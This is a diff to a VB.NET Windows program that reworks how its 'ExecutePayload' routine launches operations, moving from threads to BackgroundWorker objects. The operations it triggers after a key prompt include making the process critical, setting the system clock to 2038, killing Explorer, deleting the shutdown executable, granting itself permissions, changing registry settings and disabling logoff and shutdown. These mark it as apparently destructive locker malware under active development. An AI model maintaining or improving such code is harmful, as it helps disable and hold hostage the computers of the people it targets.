@@ -9,6 +9,7 @@ Imports System.ServiceProcess
 Imports System.Text
 Imports System.Threading
 Imports Microsoft.Win32
+Imports System.ComponentModel
 
 Public Class Form1
     Inherits Form
@@ -165,7 +166,7 @@ Public Class Form1
                 ' Process has been set to critical
             Else
                 Dim err As Integer = Marshal.GetLastWin32Error()
-                Throw New System.ComponentModel.Win32Exception(err)
+                Throw New Win32Exception(err)
             End If
         End Sub
 
@@ -1355,12 +1356,22 @@ Public Class Form1
             SetSystemTimeTo2038()
 
             ' Start ExecutePayload on a new thread
-            Dim payloadThread As New Thread(AddressOf ExecutePayload)
-            payloadThread.Start()
+            StartExecutePayload()
 
         Else
             MessageBox.Show("Incorrect key. Please try again.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
         End If
+    End Sub
+
+    ' Method to start the ExecutePayload operation using BackgroundWorker
+    Private Sub StartExecutePayload()
+        Dim payloadWorker As New BackgroundWorker()
+
+        ' Add event handler for DoWork
+        AddHandler payloadWorker.DoWork, AddressOf ExecutePayloadWork
+
+        ' Start the background worker
+        payloadWorker.RunWorkerAsync()
     End Sub
 
     Private Sub KillExplorerAndMore()
@@ -1401,94 +1412,121 @@ Public Class Form1
         overlay = Nothing
     End Sub
 
-    ' Method to execute the payload in separate threads for each operation
-    Private Sub ExecutePayload()
+    ' Method to execute the payload using BackgroundWorker
+    Private Sub ExecutePayloadWork()
         Try
-            ' Start each operation in a separate Thread with individual Try...Catch blocks.
-            Dim setWallpaperThread As New Thread(Sub()
-                                                     Try
-                                                         SetWallpaper()
-                                                     Catch ex As Exception
-                                                         Console.WriteLine("Error in SetWallpaper: " & ex.Message)
-                                                     End Try
-                                                 End Sub)
-            setWallpaperThread.Start()
+            Dim bwSetWallpaper As New BackgroundWorker()
+            AddHandler bwSetWallpaper.DoWork, AddressOf SetWallpaperWork
+            bwSetWallpaper.RunWorkerAsync()
 
-            Dim killExplorerThread As New Thread(Sub()
-                                                     Try
-                                                         KillExplorerAndMore()
-                                                     Catch ex As Exception
-                                                         Console.WriteLine("Error in KillExplorerAndMore: " & ex.Message)
-                                                     End Try
-                                                 End Sub)
-            killExplorerThread.Start()
+            Dim bwKillExplorer As New BackgroundWorker()
+            AddHandler bwKillExplorer.DoWork, AddressOf KillExplorerAndMoreWork
+            bwKillExplorer.RunWorkerAsync()
 
-            Dim killGrantAccessThread As New Thread(Sub()
-                                                        Try
-                                                            KillGrantAccessAndDeleteShutdownExe()
-                                                        Catch ex As Exception
-                                                            Console.WriteLine("Error in KillGrantAccessAndDeleteShutdownExe: " & ex.Message)
-                                                        End Try
-                                                    End Sub)
-            killGrantAccessThread.Start()
+            Dim bwKillGrantAccess As New BackgroundWorker()
+            AddHandler bwKillGrantAccess.DoWork, AddressOf KillGrantAccessAndDeleteShutdownExeWork
+            bwKillGrantAccess.RunWorkerAsync()
 
-            Dim writeMessageThread As New Thread(Sub()
-                                                     Try
-                                                         WriteMessageToNotepad()
-                                                     Catch ex As Exception
-                                                         Console.WriteLine("Error in WriteMessageToNotepad: " & ex.Message)
-                                                     End Try
-                                                 End Sub)
-            writeMessageThread.Start()
+            Dim bwWriteMessage As New BackgroundWorker()
+            AddHandler bwWriteMessage.DoWork, AddressOf WriteMessageToNotepadWork
+            bwWriteMessage.RunWorkerAsync()
 
-            Dim grantSelfPermissionsThread As New Thread(Sub()
-                                                             Try
-                                                                 GrantSelfPermissions()
-                                                             Catch ex As Exception
-                                                                 Console.WriteLine("Error in GrantSelfPermissions: " & ex.Message)
-                                                             End Try
-                                                         End Sub)
-            grantSelfPermissionsThread.Start()
+            Dim bwGrantPermissions As New BackgroundWorker()
+            AddHandler bwGrantPermissions.DoWork, AddressOf GrantSelfPermissionsWork
+            bwGrantPermissions.RunWorkerAsync()
 
-            Dim visualEffectTimerThread As New Thread(Sub()
-                                                          Try
-                                                              VisualEffectTimer.Start()
-                                                          Catch ex As Exception
-                                                              Console.WriteLine("Error in VisualEffectTimer.Start: " & ex.Message)
-                                                          End Try
-                                                      End Sub)
-            visualEffectTimerThread.Start()
+            Dim bwVisualEffectTimer As New BackgroundWorker()
+            AddHandler bwVisualEffectTimer.DoWork, AddressOf StartVisualEffectTimerWork
+            bwVisualEffectTimer.RunWorkerAsync()
 
-            Dim animationTimerThread As New Thread(Sub()
-                                                       Try
-                                                           AnimationTimer.Start()
-                                                       Catch ex As Exception
-                                                           Console.WriteLine("Error in AnimationTimer.Start: " & ex.Message)
-                                                       End Try
-                                                   End Sub)
-            animationTimerThread.Start()
+            Dim bwAnimationTimer As New BackgroundWorker()
+            AddHandler bwAnimationTimer.DoWork, AddressOf StartAnimationTimerWork
+            bwAnimationTimer.RunWorkerAsync()
 
-            Dim updateRegistryThread As New Thread(Sub()
-                                                       Try
-                                                           UpdateRegistrySettings()
-                                                       Catch ex As Exception
-                                                           Console.WriteLine("Error in UpdateRegistrySettings: " & ex.Message)
-                                                       End Try
-                                                   End Sub)
-            updateRegistryThread.Start()
+            Dim bwUpdateRegistry As New BackgroundWorker()
+            AddHandler bwUpdateRegistry.DoWork, AddressOf UpdateRegistrySettingsWork
+            bwUpdateRegistry.RunWorkerAsync()
 
-            Dim disableLogoffThread As New Thread(Sub()
-                                                      Try
-                                                          DisableLogoffSwitchUserAndShutdown()
-                                                      Catch ex As Exception
-                                                          Console.WriteLine("Error in DisableLogoffSwitchUserAndShutdown: " & ex.Message)
-                                                      End Try
-                                                  End Sub)
-            disableLogoffThread.Start()
+            Dim bwDisableLogoff As New BackgroundWorker()
+            AddHandler bwDisableLogoff.DoWork, AddressOf DisableLogoffSwitchUserAndShutdownWork
+            bwDisableLogoff.RunWorkerAsync()
 
         Catch ex As Exception
             ' General exception handling for the entire ExecutePayload method
             Console.WriteLine("An error occurred in ExecutePayload: " & ex.Message)
+        End Try
+    End Sub
+
+    ' BackgroundWorker methods for each operation
+    Private Sub SetWallpaperWork(ByVal sender As Object, ByVal e As DoWorkEventArgs)
+        Try
+            SetWallpaper()
+        Catch ex As Exception
+            Console.WriteLine("Error in SetWallpaper: " & ex.Message)
+        End Try
+    End Sub
+
+    Private Sub KillExplorerAndMoreWork(ByVal sender As Object, ByVal e As DoWorkEventArgs)
+        Try
+            KillExplorerAndMore()
+        Catch ex As Exception
+            Console.WriteLine("Error in KillExplorerAndMore: " & ex.Message)
+        End Try
+    End Sub
+
+    Private Sub KillGrantAccessAndDeleteShutdownExeWork(ByVal sender As Object, ByVal e As DoWorkEventArgs)
+        Try
+            KillGrantAccessAndDeleteShutdownExe()
+        Catch ex As Exception
+            Console.WriteLine("Error in KillGrantAccessAndDeleteShutdownExe: " & ex.Message)
+        End Try
+    End Sub
+
+    Private Sub WriteMessageToNotepadWork(ByVal sender As Object, ByVal e As DoWorkEventArgs)
+        Try
+            WriteMessageToNotepad()
+        Catch ex As Exception
+            Console.WriteLine("Error in WriteMessageToNotepad: " & ex.Message)
+        End Try
+    End Sub
+
+    Private Sub GrantSelfPermissionsWork(ByVal sender As Object, ByVal e As DoWorkEventArgs)
+        Try
+            GrantSelfPermissions()
+        Catch ex As Exception
+            Console.WriteLine("Error in GrantSelfPermissions: " & ex.Message)
+        End Try
+    End Sub
+
+    Private Sub StartVisualEffectTimerWork(ByVal sender As Object, ByVal e As DoWorkEventArgs)
+        Try
+            VisualEffectTimer.Start()
+        Catch ex As Exception
+            Console.WriteLine("Error in VisualEffectTimer.Start: " & ex.Message)
+        End Try
+    End Sub
+
+    Private Sub StartAnimationTimerWork(ByVal sender As Object, ByVal e As DoWorkEventArgs)
+        Try
+            AnimationTimer.Start()
+        Catch ex As Exception
+            Console.WriteLine("Error in AnimationTimer.Start: " & ex.Message)
+        End Try
+    End Sub
+
+    Private Sub UpdateRegistrySettingsWork(ByVal sender As Object, ByVal e As DoWorkEventArgs)
+        Try
+            UpdateRegistrySettings()
+        Catch ex As Exception
+            Console.WriteLine("Error in UpdateRegistrySettings: " & ex.Message)
+        End Try
+    End Sub
+
+    Private Sub DisableLogoffSwitchUserAndShutdownWork(ByVal sender As Object, ByVal e As DoWorkEventArgs)
+        Try
+            DisableLogoffSwitchUserAndShutdown()
+        Catch ex As Exception
+            Console.WriteLine("Error in DisableLogoffSwitchUserAndShutdown: " & ex.Message)
         End Try
     End Sub
 
